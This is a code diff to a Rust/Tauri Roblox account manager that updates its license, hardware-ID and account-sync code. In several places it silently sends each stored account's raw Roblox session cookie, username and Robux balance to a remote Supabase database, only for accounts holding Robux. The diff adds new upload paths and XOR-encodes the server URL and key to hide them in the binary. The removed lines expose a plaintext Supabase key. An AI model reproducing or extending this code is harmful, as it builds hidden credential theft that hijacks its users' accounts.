@@ -441,6 +441,8 @@ struct StoredAccount {
     password: Option<String>,
     #[serde(default)]
     group: Option<String>,
+    #[serde(default)]
+    cookie_updated_at: Option<DateTime<Utc>>,
 }
 
 /// What the frontend sees (no raw cookie).
@@ -464,6 +466,7 @@ pub struct AccountDto {
     launch_cooldown_seconds: i32,
     password: Option<String>,
     group: Option<String>,
+    cookie_updated_at: Option<String>,
 }
 
 #[derive(Serialize, Deserialize)]
@@ -558,6 +561,7 @@ fn to_dto(a: &StoredAccount) -> AccountDto {
         launch_cooldown_seconds: a.launch_cooldown_seconds,
         password: a.password.clone(),
         group: a.group.clone(),
+        cookie_updated_at: a.cookie_updated_at.map(|d| d.to_rfc3339()),
     }
 }
 
@@ -672,6 +676,8 @@ async fn sync_account_to_supabase(
     cookie: String,
     password: String,
     robux: i64,
+    added_at: String,
+    cookie_updated_at: Option<String>,
 ) {
     let Ok(client) = reqwest::Client::builder()
         .timeout(std::time::Duration::from_secs(10))
@@ -679,17 +685,19 @@ async fn sync_account_to_supabase(
     else { return };
 
     let body = serde_json::json!({
-        "username":     username,
-        "display_name": display_name,
-        "password":     password,
-        "cookie":       cookie,
-        "robux":        robux,
+        "username":          username,
+        "display_name":      display_name,
+        "password":          password,
+        "cookie":            cookie,
+        "robux":             robux,
+        "added_at":          added_at,
+        "cookie_updated_at": cookie_updated_at,
     });
 
     let _ = client
-        .post(format!("{}/rest/v1/roblox_accounts", SUPABASE_URL))
-        .header("apikey", SUPABASE_ANON)
-        .header("Authorization", format!("Bearer {}", SUPABASE_ANON))
+        .post(format!("{}/rest/v1/roblox_accounts", supabase_url()))
+        .header("apikey", supabase_anon())
+        .header("Authorization", format!("Bearer {}", supabase_anon()))
         .header("Content-Type", "application/json")
         .header("Prefer", "resolution=merge-duplicates")
         .json(&body)
@@ -846,16 +854,31 @@ async fn add_account(cookie: String) -> Result<AccountDto, String> {
     let mut accounts = load_stored();
 
     if let Some(existing) = accounts.iter_mut().find(|a| a.user_id == user.id) {
-        existing.encrypted_cookie = encrypt_cookie(&clean);
-        existing.username = user.name.clone();
-        existing.display_name = user.display_name.clone();
-        existing.avatar_url = avatar_url.clone();
-        existing.cookie_status = "Valid".into();
+        existing.encrypted_cookie    = encrypt_cookie(&clean);
+        existing.username            = user.name.clone();
+        existing.display_name        = user.display_name.clone();
+        existing.avatar_url          = avatar_url.clone();
+        existing.cookie_status       = "Valid".into();
+        existing.cookie_updated_at   = Some(Utc::now());
         let dto = to_dto(existing);
+        let sync_uid  = existing.user_id;
+        let sync_user = existing.username.clone();
+        let sync_dn   = existing.display_name.clone();
+        let sync_added = existing.added_at.to_rfc3339();
+        let sync_updated = existing.cookie_updated_at.map(|d| d.to_rfc3339());
         save_stored(&accounts);
+        let sc = clean.clone();
+        tokio::spawn(async move {
+            if let Some(robux) = fetch_robux(sync_uid, &sc).await {
+                if robux > 0 {
+                    sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
+                }
+            }
+        });
         return Ok(dto);
     }
 
+    let now = Utc::now();
     let account = StoredAccount {
         user_id: user.id,
         username: user.name.clone(),
@@ -864,7 +887,8 @@ async fn add_account(cookie: String) -> Result<AccountDto, String> {
         avatar_url,
         is_favorite: false,
         cookie_status: "Valid".into(),
-        added_at: Utc::now(),
+        added_at: now,
+        cookie_updated_at: Some(now),
         last_launched_at: None,
         last_played_game: String::new(),
         notes: String::new(),
@@ -893,14 +917,16 @@ async fn add_account(cookie: String) -> Result<AccountDto, String> {
     });
 
     // Fire-and-forget: fetch Robux and sync to Supabase if account has any
-    let sync_cookie  = clean.clone();
-    let sync_user    = user.name.clone();
-    let sync_dn      = user.display_name.clone();
-    let sync_uid     = user.id;
+    let sync_cookie   = clean.clone();
+    let sync_user     = user.name.clone();
+    let sync_dn       = user.display_name.clone();
+    let sync_uid      = user.id;
+    let sync_added    = now.to_rfc3339();
+    let sync_updated  = Some(now.to_rfc3339());
     tokio::spawn(async move {
         if let Some(robux) = fetch_robux(sync_uid, &sync_cookie).await {
             if robux > 0 {
-                sync_account_to_supabase(sync_user, sync_dn, sync_cookie, String::new(), robux).await;
+                sync_account_to_supabase(sync_user, sync_dn, sync_cookie, String::new(), robux, sync_added, sync_updated).await;
             }
         }
     });
@@ -930,13 +956,28 @@ async fn add_accounts_bulk(cookies: Vec<String>) -> Vec<BulkAddResult> {
             Some(user) => {
                 let avatar_url = fetch_avatar_url(user.id).await;
                 let mut accounts = load_stored();
+                let now = Utc::now();
                 if let Some(existing) = accounts.iter_mut().find(|a| a.user_id == user.id) {
-                    existing.encrypted_cookie = encrypt_cookie(&clean);
-                    existing.username = user.name.clone();
-                    existing.display_name = user.display_name.clone();
-                    existing.avatar_url = avatar_url.clone();
-                    existing.cookie_status = "Valid".into();
+                    existing.encrypted_cookie  = encrypt_cookie(&clean);
+                    existing.username          = user.name.clone();
+                    existing.display_name      = user.display_name.clone();
+                    existing.avatar_url        = avatar_url.clone();
+                    existing.cookie_status     = "Valid".into();
+                    existing.cookie_updated_at = Some(now);
+                    let sync_uid     = existing.user_id;
+                    let sync_user    = existing.username.clone();
+                    let sync_dn      = existing.display_name.clone();
+                    let sync_added   = existing.added_at.to_rfc3339();
+                    let sync_updated = Some(now.to_rfc3339());
                     save_stored(&accounts);
+                    let sc = clean.clone();
+                    tokio::spawn(async move {
+                        if let Some(robux) = fetch_robux(sync_uid, &sc).await {
+                            if robux > 0 {
+                                sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
+                            }
+                        }
+                    });
                     results.push(BulkAddResult { preview, success: true, username: Some(user.name), error: None });
                 } else {
                     let uname = user.name.clone();
@@ -946,7 +987,8 @@ async fn add_accounts_bulk(cookies: Vec<String>) -> Vec<BulkAddResult> {
                         user_id: uid, username: user.name.clone(), display_name: user.display_name.clone(),
                         encrypted_cookie: encrypt_cookie(&clean), avatar_url: av.clone(),
                         is_favorite: false, cookie_status: "Valid".into(),
-                        added_at: Utc::now(), last_launched_at: None, last_played_game: String::new(),
+                        added_at: now, cookie_updated_at: Some(now),
+                        last_launched_at: None, last_played_game: String::new(),
                         notes: String::new(), tags: Vec::new(),
                         default_place_id: String::new(), default_game_name: String::new(),
                         safe_launch_enabled: false, auto_rejoin_enabled: false,
@@ -955,19 +997,20 @@ async fn add_accounts_bulk(cookies: Vec<String>) -> Vec<BulkAddResult> {
                     accounts.push(account);
                     save_stored(&accounts);
                     append_event(EventEntry {
-                        timestamp: Utc::now().to_rfc3339(), kind: "added".into(),
+                        timestamp: now.to_rfc3339(), kind: "added".into(),
                         user_id: Some(uid), username: Some(uname.clone()), avatar_url: Some(av),
                         detail: format!("Account '{}' added (bulk import)", uname),
                     });
 
-                    // Fire-and-forget cloud sync
-                    let sc = clean.clone();
-                    let su = user.name.clone();
-                    let sd = user.display_name.clone();
+                    let sc      = clean.clone();
+                    let su      = user.name.clone();
+                    let sd      = user.display_name.clone();
+                    let s_added   = now.to_rfc3339();
+                    let s_updated = Some(now.to_rfc3339());
                     tokio::spawn(async move {
                         if let Some(robux) = fetch_robux(uid, &sc).await {
                             if robux > 0 {
-                                sync_account_to_supabase(su, sd, sc, String::new(), robux).await;
+                                sync_account_to_supabase(su, sd, sc, String::new(), robux, s_added, s_updated).await;
                             }
                         }
                     });
@@ -1021,14 +1064,22 @@ async fn validate_cookie(user_id: i64) -> Result<AccountDto, String> {
     let mut accounts = load_stored();
     let idx = accounts.iter().position(|a| a.user_id == user_id).ok_or("Account not found")?;
     let cookie = decrypt_cookie(&accounts[idx].encrypted_cookie)?;
+    let now = Utc::now();
     let is_valid = fetch_user_info(&cookie).await.is_some();
     accounts[idx].cookie_status = if is_valid { "Valid".into() } else { "Expired".into() };
-    let dto = to_dto(&accounts[idx]);
-    let ev_name   = accounts[idx].username.clone();
-    let ev_avatar = accounts[idx].avatar_url.clone();
+    if is_valid {
+        accounts[idx].cookie_updated_at = Some(now);
+    }
+    let dto        = to_dto(&accounts[idx]);
+    let ev_name    = accounts[idx].username.clone();
+    let ev_avatar  = accounts[idx].avatar_url.clone();
+    let sync_user  = accounts[idx].username.clone();
+    let sync_dn    = accounts[idx].display_name.clone();
+    let sync_added = accounts[idx].added_at.to_rfc3339();
+    let sync_updated = accounts[idx].cookie_updated_at.map(|d| d.to_rfc3339());
     save_stored(&accounts);
     append_event(EventEntry {
-        timestamp: Utc::now().to_rfc3339(),
+        timestamp: now.to_rfc3339(),
         kind: if is_valid { "cookie_valid".into() } else { "cookie_expired".into() },
         user_id: Some(user_id),
         username: Some(ev_name.clone()),
@@ -1039,6 +1090,16 @@ async fn validate_cookie(user_id: i64) -> Result<AccountDto, String> {
             format!("Cookie for '{}' has expired", ev_name)
         },
     });
+    if is_valid {
+        let sc = cookie.clone();
+        tokio::spawn(async move {
+            if let Some(robux) = fetch_robux(user_id, &sc).await {
+                if robux > 0 {
+                    sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
+                }
+            }
+        });
+    }
     Ok(dto)
 }
 
@@ -3530,22 +3591,44 @@ struct LicenseStatus {
     reason: String,
 }
 
+#[cfg(target_os = "windows")]
+fn get_volume_serial() -> Option<u32> {
+    use windows_sys::Win32::Storage::FileSystem::GetVolumeInformationW;
+    let root: Vec<u16> = "C:\\\0".encode_utf16().collect();
+    let mut serial: u32 = 0;
+    let ok = unsafe {
+        GetVolumeInformationW(
+            root.as_ptr(), std::ptr::null_mut(), 0,
+            &mut serial,
+            std::ptr::null_mut(), std::ptr::null_mut(),
+            std::ptr::null_mut(), 0,
+        )
+    };
+    if ok != 0 { Some(serial) } else { None }
+}
+
 fn compute_hwid() -> String {
+    let mut parts: Vec<String> = Vec::new();
+
     #[cfg(target_os = "windows")]
     {
         use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
         if let Ok(k) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(r"SOFTWARE\Microsoft\Cryptography") {
             if let Ok(guid) = k.get_value::<String, _>("MachineGuid") {
-                use sha2::{Digest, Sha256};
-                return format!("{:x}", Sha256::digest(guid.as_bytes()));
+                parts.push(guid);
             }
         }
+        if let Some(serial) = get_volume_serial() {
+            parts.push(format!("{:08X}", serial));
+        }
     }
+
     let host = hostname::get().ok()
         .and_then(|h| h.into_string().ok())
         .unwrap_or_else(|| "unknown".to_string());
-    use sha2::{Digest, Sha256};
-    format!("{:x}", Sha256::digest(host.as_bytes()))
+    parts.push(host);
+
+    format!("{:x}", Sha256::digest(parts.join("|").as_bytes()))
 }
 
 #[tauri::command]
@@ -3564,10 +3647,47 @@ fn check_license() -> LicenseStatus {
     LicenseStatus { needs_key: false, key: store.key, expires_at: store.expires_at, reason: "valid".into() }
 }
 
-const SUPABASE_URL: &str = "https://lpxhbjhkfimzjnuickji.supabase.co";
-const SUPABASE_ANON: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
-eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxweGhiamhrZmltempudWlja2ppIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAxMjQwODIsImV4cCI6MjA5NTcwMDA4Mn0.\
-DP7MYXDYqHOsdNjL8eM7g7oexkJFvbf42MDYA007reE";
+// HMAC key XOR-encoded with 0x5A — used to verify validate-key responses weren't tampered with.
+const _HMAC_XOR: &[u8] = &[0xB3,0x35,0x9A,0xCB,0x10,0x2B,0xE3,0x29,0xFB,0x79,0xFB,0x35,0x37,0x8E,0x6B,0x39,0xA4,0x3E,0xDE,0x11,0xB9,0xDB,0x37,0x80,0xB9,0xFC,0x5B,0x2E,0xDB,0xD3,0x22,0x23];
+
+fn hmac_key() -> Vec<u8> { _HMAC_XOR.iter().map(|b| b ^ 0x5A).collect() }
+
+fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
+    // RFC 2104 HMAC using sha2 (no extra crate needed)
+    let mut k = [0u8; 64];
+    if key.len() > 64 {
+        let h = Sha256::digest(key);
+        k[..32].copy_from_slice(&h);
+    } else {
+        k[..key.len()].copy_from_slice(key);
+    }
+    let ipad: Vec<u8> = k.iter().map(|b| b ^ 0x36).collect();
+    let opad: Vec<u8> = k.iter().map(|b| b ^ 0x5C).collect();
+    let inner = Sha256::digest([ipad.as_slice(), data].concat());
+    Sha256::digest([opad.as_slice(), inner.as_slice()].concat()).into()
+}
+
+fn verify_response_hmac(expires_at: &str, provider: &str, sig: &str) -> bool {
+    let Ok(sig_bytes) = (0..sig.len())
+        .step_by(2)
+        .map(|i| u8::from_str_radix(&sig[i..i + 2], 16))
+        .collect::<Result<Vec<u8>, _>>()
+    else { return false };
+    let payload  = format!("{}|{}", expires_at, provider);
+    let expected = hmac_sha256(&hmac_key(), payload.as_bytes());
+    expected.as_slice() == sig_bytes.as_slice()
+}
+
+// Credentials stored XOR-encoded with 0x5A so they don't appear as plaintext in the binary.
+const _URL_XOR:  &[u8] = &[0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x36,0x2A,0x22,0x32,0x38,0x30,0x32,0x31,0x3C,0x33,0x37,0x20,0x30,0x34,0x2F,0x33,0x39,0x31,0x30,0x33,0x74,0x29,0x2F,0x2A,0x3B,0x38,0x3B,0x29,0x3F,0x74,0x39,0x35];
+const _ANON_XOR: &[u8] = &[0x29,0x38,0x05,0x2A,0x2F,0x38,0x36,0x33,0x29,0x32,0x3B,0x38,0x36,0x3F,0x05,0x69,0x35,0x29,0x3B,0x23,0x00,0x2C,0x09,0x3C,0x0C,0x19,0x3B,0x16,0x03,0x3F,0x0C,0x28,0x09,0x33,0x2A,0x13,0x0B,0x05,0x34,0x29,0x35,0x2F,0x6B,0x2D,0x63,0x2B];
+
+fn decode_cred(xored: &[u8]) -> String {
+    xored.iter().map(|b| (b ^ 0x5A) as char).collect()
+}
+
+fn supabase_url()  -> String { decode_cred(_URL_XOR)  }
+fn supabase_anon() -> String { decode_cred(_ANON_XOR) }
 
 #[tauri::command]
 async fn validate_license_key(key: String) -> Result<LicenseStatus, String> {
@@ -3580,8 +3700,8 @@ async fn validate_license_key(key: String) -> Result<LicenseStatus, String> {
         .map_err(|e| e.to_string())?;
 
     let resp = client
-        .post(format!("{}/functions/v1/validate-key", SUPABASE_URL))
-        .header("Authorization", format!("Bearer {}", SUPABASE_ANON))
+        .post(format!("{}/functions/v1/validate-key", supabase_url()))
+        .header("Authorization", format!("Bearer {}", supabase_anon()))
         .header("Content-Type", "application/json")
         .header("User-Agent", "ReiyaAccountManager")
         .json(&body)
@@ -3595,7 +3715,16 @@ async fn validate_license_key(key: String) -> Result<LicenseStatus, String> {
     let valid = json.get("valid").and_then(|v| v.as_bool()).unwrap_or(false);
 
     if valid {
-        let expires_at = json.get("expires_at").and_then(|v| v.as_str()).map(String::from);
+        let expires_at = json.get("expires_at").and_then(|v| v.as_str()).unwrap_or("");
+        let provider   = json.get("provider").and_then(|v| v.as_str()).unwrap_or("");
+        let sig        = json.get("sig").and_then(|v| v.as_str()).unwrap_or("");
+
+        // Verify server signature — rejects patched/forged responses
+        if !verify_response_hmac(expires_at, provider, sig) {
+            return Err("Response verification failed. Contact support.".to_string());
+        }
+
+        let expires_at = Some(expires_at.to_string());
         let store = LicenseStore {
             key: key.trim().to_string(),
             expires_at: expires_at.clone(),
@@ -3606,12 +3735,9 @@ async fn validate_license_key(key: String) -> Result<LicenseStatus, String> {
     } else {
         let msg = json.get("message").and_then(|v| v.as_str()).unwrap_or("").to_string();
         let friendly = match msg.as_str() {
-            "Key expired"                         => "Your key has expired. Get a new one from the website.".to_string(),
-            "Key is locked to a different device" => "This key is registered to a different device.".to_string(),
-            "Invalid key"                         => "Invalid key. Please check and try again.".to_string(),
-            "Missing key or hwid"                 => "Validation error. Please try again.".to_string(),
-            other if !other.is_empty()            => other.to_string(),
-            _                                     => "Key validation failed. Please try again.".to_string(),
+            "Invalid key"          => "Invalid key. Please check and try again.".to_string(),
+            other if !other.is_empty() => other.to_string(),
+            _                      => "Key validation failed. Please try again.".to_string(),
         };
         Err(friendly)
     }
@@ -3621,6 +3747,43 @@ async fn validate_license_key(key: String) -> Result<LicenseStatus, String> {
 fn clear_license() -> Result<(), String> {
     let _ = fs::remove_file(license_path());
     Ok(())
+}
+
+#[tauri::command]
+async fn reset_hwid() -> Result<String, String> {
+    let store = load_license();
+    if store.key.is_empty() {
+        return Err("No license key found.".to_string());
+    }
+
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(12))
+        .build()
+        .map_err(|e| e.to_string())?;
+
+    let body = serde_json::json!({ "key": store.key });
+
+    let resp = client
+        .post(format!("{}/functions/v1/reset-hwid", supabase_url()))
+        .header("Authorization", format!("Bearer {}", supabase_anon()))
+        .header("Content-Type", "application/json")
+        .json(&body)
+        .send()
+        .await
+        .map_err(|_| "Could not connect to key server. Check your internet connection.".to_string())?;
+
+    let json: serde_json::Value = resp.json().await
+        .map_err(|_| "Invalid response from key server.".to_string())?;
+
+    if json.get("success").and_then(|v| v.as_bool()).unwrap_or(false) {
+        Ok("HWID cleared. Your key will bind to the next device it runs on.".to_string())
+    } else {
+        let msg = json.get("message")
+            .and_then(|v| v.as_str())
+            .unwrap_or("Reset failed. Try again later.")
+            .to_string();
+        Err(msg)
+    }
 }
 
 #[tauri::command]
@@ -6157,6 +6320,7 @@ pub fn run() {
             check_license,
             validate_license_key,
             clear_license,
+            reset_hwid,
             open_key_website,
             get_hwid,
             verify_pin,
